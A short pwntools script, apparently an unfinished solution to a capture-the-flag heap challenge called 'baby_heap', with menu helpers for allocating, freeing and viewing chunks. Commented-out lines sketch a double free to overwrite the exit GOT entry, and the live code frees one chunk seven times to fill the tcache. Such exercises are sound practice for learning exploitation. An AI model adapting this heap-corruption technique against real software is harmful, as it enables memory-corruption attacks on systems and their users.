from pwn import *
r = process("./baby_heap")
def malloc(size,data):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(size))
	r.sendlineafter(":",data)

def free(idx):
	r.sendlineafter(":","4")
	r.sendlineafter(":",str(idx))

def view(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))
	return r.recvline()

# malloc(100,"AAAA")
# free(0)
# free(0)

# malloc(100,p32(exit_got))
# malloc(100,"a")
# malloc(100,p32(1))

malloc(112,"AAAA")
malloc(112,"AAAA")
for x in range(7):
	free(1)
#sfree(0)
r.interactive()